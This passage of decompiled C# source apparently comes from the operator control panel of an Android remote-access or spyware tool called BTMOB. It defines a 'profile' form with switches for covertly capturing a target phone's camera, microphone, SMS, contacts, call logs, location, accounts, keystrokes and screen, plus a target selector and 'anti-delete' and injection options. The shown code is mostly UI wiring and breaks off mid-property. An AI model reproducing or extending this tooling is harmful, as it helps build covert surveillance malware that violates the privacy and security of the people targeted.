using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.WinForms;
using Newtonsoft.Json;

namespace BTMOB;

[DesignerGenerated]
public class profile : basestyle
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__487_002D0
	{
		public string _0024VB_0024Local_loadit;

		public profile _0024VB_0024Me;

		public _Closure_0024__487_002D0(_Closure_0024__487_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_loadit = arg0._0024VB_0024Local_loadit;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			foreach (object item in _0024VB_0024Me.Combodats.Items)
			{
				string fname = Conversions.ToString(item);
				VB_0024AnonymousType_29<string, string, string> data = new VB_0024AnonymousType_29<string, string, string>("L", _0024VB_0024Local_loadit, fname);
				_0024VB_0024Me.loadrecord(data);
				Thread.Sleep(1);
			}
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkaccess")]
	private DrakeUIOSSwitch _checkaccess;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkcamera")]
	private DrakeUIOSSwitch _checkcamera;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkcontact")]
	private DrakeUIOSSwitch _checkcontact;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkssms")]
	private DrakeUIOSSwitch _checkssms;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkcallph")]
	private DrakeUIOSSwitch _checkcallph;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkloc")]
	private DrakeUIOSSwitch _checkloc;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkmic")]
	private DrakeUIOSSwitch _checkmic;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkaccounts")]
	private DrakeUIOSSwitch _checkaccounts;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkcalllog")]
	private DrakeUIOSSwitch _checkcalllog;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkinstll")]
	private DrakeUIOSSwitch _checkinstll;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkdraw")]
	private DrakeUIOSSwitch _checkdraw;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkbtry")]
	private DrakeUIOSSwitch _checkbtry;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkwallp")]
	private DrakeUIOSSwitch _checkwallp;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkkeys")]
	private DrakeUIOSSwitch _checkkeys;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("chkLivnotify")]
	private DrakeUIOSSwitch _chkLivnotify;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkRvlinks")]
	private DrakeUIOSSwitch _checkRvlinks;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("chkRvapps")]
	private DrakeUIOSSwitch _chkRvapps;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkRactv")]
	private DrakeUIOSSwitch _checkRactv;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkRnotfy")]
	private DrakeUIOSSwitch _checkRnotfy;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("srchbtn")]
	private DrakeUIButtonIcon _srchbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("comboTargts")]
	private DrakeUIComboBox _comboTargts;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("delbtn")]
	private DrakeUIButtonIcon _delbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("loadworker")]
	private BackgroundWorker _loadworker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private System.Windows.Forms.Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkreadsms")]
	private DrakeUIOSSwitch _checkreadsms;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clrbtn")]
	private DrakeUIButtonIcon _clrbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkwritstng")]
	private DrakeUIOSSwitch _checkwritstng;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkaccfiles")]
	private DrakeUIOSSwitch _checkaccfiles;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("chkscrns")]
	private DrakeUIOSSwitch _chkscrns;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checknotifys")]
	private DrakeUIOSSwitch _checknotifys;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Checkatoject")]
	private DrakeUIOSSwitch _Checkatoject;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkantdelete")]
	private DrakeUIOSSwitch _checkantdelete;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Checkcryptmsg")]
	private DrakeUIOSSwitch _Checkcryptmsg;

	public BTClient Btcli;

	public Form1 mainform;

	private bool holdrequests;

	[field: AccessedThroughProperty("maintabctrl")]
	internal virtual DrakeUITabControl maintabctrl
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage3")]
	internal virtual TabPage TabPage3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage4")]
	internal virtual TabPage TabPage4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkaccess
	{
		[CompilerGenerated]
		get
		{
			return _checkaccess;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkaccess_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkaccess;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkaccess = value;
			drakeUIOSSwitch = _checkaccess;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim3")]
	internal virtual DrakeUISymbolLabel prim3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkcamera
	{
		[CompilerGenerated]
		get
		{
			return _checkcamera;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkcamera_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkcamera;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkcamera = value;
			drakeUIOSSwitch = _checkcamera;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("prim1")]
	internal virtual DrakeUISymbolLabel prim1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim4")]
	internal virtual DrakeUISymbolLabel prim4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkcontact
	{
		[CompilerGenerated]
		get
		{
			return _checkcontact;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkcontact_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkcontact;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkcontact = value;
			drakeUIOSSwitch = _checkcontact;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel13")]
	internal virtual Panel Panel13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim10")]
	internal virtual DrakeUISymbolLabel prim10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkssms
	{
		[CompilerGenerated]
		get
		{
			return _checkssms;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkssms_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkssms;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkssms = value;
			drakeUIOSSwitch = _checkssms;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel12")]
	internal virtual Panel Panel12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim9")]
	internal virtual DrakeUISymbolLabel prim9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkcallph
	{
		[CompilerGenerated]
		get
		{
			return _checkcallph;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkcallph_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkcallph;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkcallph = value;
			drakeUIOSSwitch = _checkcallph;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel11")]
	internal virtual Panel Panel11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim8")]
	internal virtual DrakeUISymbolLabel prim8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkloc
	{
		[CompilerGenerated]
		get
		{
			return _checkloc;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkloc_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkloc;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkloc = value;
			drakeUIOSSwitch = _checkloc;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel10")]
	internal virtual Panel Panel10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim7")]
	internal virtual DrakeUISymbolLabel prim7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkmic
	{
		[CompilerGenerated]
		get
		{
			return _checkmic;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkmic_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkmic;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkmic = value;
			drakeUIOSSwitch = _checkmic;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim6")]
	internal virtual DrakeUISymbolLabel prim6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkaccounts
	{
		[CompilerGenerated]
		get
		{
			return _checkaccounts;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkaccounts_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkaccounts;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkaccounts = value;
			drakeUIOSSwitch = _checkaccounts;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim5")]
	internal virtual DrakeUISymbolLabel prim5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkcalllog
	{
		[CompilerGenerated]
		get
		{
			return _checkcalllog;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkcalllog_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkcalllog;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkcalllog = value;
			drakeUIOSSwitch = _checkcalllog;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel17")]
	internal virtual Panel Panel17
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim14")]
	internal virtual DrakeUISymbolLabel prim14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkinstll
	{
		[CompilerGenerated]
		get
		{
			return _checkinstll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkinstll_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkinstll;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkinstll = value;
			drakeUIOSSwitch = _checkinstll;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel16")]
	internal virtual Panel Panel16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim13")]
	internal virtual DrakeUISymbolLabel prim13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkdraw
	{
		[CompilerGenerated]
		get
		{
			return _checkdraw;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkdraw_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkdraw;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkdraw = value;
			drakeUIOSSwitch = _checkdraw;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel15")]
	internal virtual Panel Panel15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim12")]
	internal virtual DrakeUISymbolLabel prim12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkbtry
	{
		[CompilerGenerated]
		get
		{
			return _checkbtry;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkbtry_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkbtry;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkbtry = value;
			drakeUIOSSwitch = _checkbtry;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel14")]
	internal virtual Panel Panel14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim11")]
	internal virtual DrakeUISymbolLabel prim11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkwallp
	{
		[CompilerGenerated]
		get
		{
			return _checkwallp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkwallp_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkwallp;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkwallp = value;
			drakeUIOSSwitch = _checkwallp;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel18")]
	internal virtual Panel Panel18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn2")]
	internal virtual DrakeUISymbolLabel optn2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkkeys
	{
		[CompilerGenerated]
		get
		{
			return _checkkeys;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkkeys_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkkeys;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkkeys = value;
			drakeUIOSSwitch = _checkkeys;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel19")]
	internal virtual Panel Panel19
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel24")]
	internal virtual Panel Panel24
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn7")]
	internal virtual DrakeUISymbolLabel optn7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch chkLivnotify
	{
		[CompilerGenerated]
		get
		{
			return _chkLivnotify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = chkLivnotify_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _chkLivnotify;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_chkLivnotify = value;
			drakeUIOSSwitch = _chkLivnotify;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel23")]
	internal virtual Panel Panel23
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn6")]
	internal virtual DrakeUISymbolLabel optn6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkRvlinks
	{
		[CompilerGenerated]
		get
		{
			return _checkRvlinks;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkRvlinks_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkRvlinks;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkRvlinks = value;
			drakeUIOSSwitch = _checkRvlinks;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel22")]
	internal virtual Panel Panel22
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn5")]
	internal virtual DrakeUISymbolLabel optn5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch chkRvapps
	{
		[CompilerGenerated]
		get
		{
			return _chkRvapps;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = chkRvapps_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _chkRvapps;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_chkRvapps = value;
			drakeUIOSSwitch = _chkRvapps;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel21")]
	internal virtual Panel Panel21
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn4")]
	internal virtual DrakeUISymbolLabel optn4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkRactv
	{
		[CompilerGenerated]
		get
		{
			return _checkRactv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkRactv_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkRactv;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkRactv = value;
			drakeUIOSSwitch = _checkRactv;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel20")]
	internal virtual Panel Panel20
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("optn3")]
	internal virtual DrakeUISymbolLabel optn3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkRnotfy
	{
		[CompilerGenerated]
		get
		{
			return _checkRnotfy;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkRnotfy_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkRnotfy;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkRnotfy = value;
			drakeUIOSSwitch = _checkRnotfy;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel25")]
	internal virtual Panel Panel25
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon srchbtn
	{
		[CompilerGenerated]
		get
		{
			return _srchbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = srchfilsbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _srchbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_srchbtn = value;
			drakeUIButtonIcon = _srchbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIComboBox comboTargts
	{
		[CompilerGenerated]
		get
		{
			return _comboTargts;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = comboTargts_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _comboTargts;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_comboTargts = value;
			drakeUIComboBox = _comboTargts;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon delbtn
	{
		[CompilerGenerated]
		get
		{
			return _delbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _delbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_delbtn = value;
			drakeUIButtonIcon = _delbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("logactivitystext")]
	internal virtual RichTextBox logactivitystext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Combodats")]
	internal virtual DrakeUIComboBox Combodats
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel26")]
	internal virtual Panel Panel26
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mainstatelabel")]
	internal virtual Label mainstatelabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker loadworker
	{
		[CompilerGenerated]
		get
		{
			return _loadworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			BackgroundWorker backgroundWorker = _loadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_loadworker = value;
			backgroundWorker = _loadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			System.Windows.Forms.Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel27")]
	internal virtual Panel Panel27
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim15")]
	internal virtual DrakeUISymbolLabel prim15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkreadsms
	{
		[CompilerGenerated]
		get
		{
			return _checkreadsms;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = checkreadsms_Click;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkreadsms;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click -= value2;
			}
			_checkreadsms = value;
			drakeUIOSSwitch = _checkreadsms;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon clrbtn
	{
		[CompilerGenerated]
		get
		{
			return _clrbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
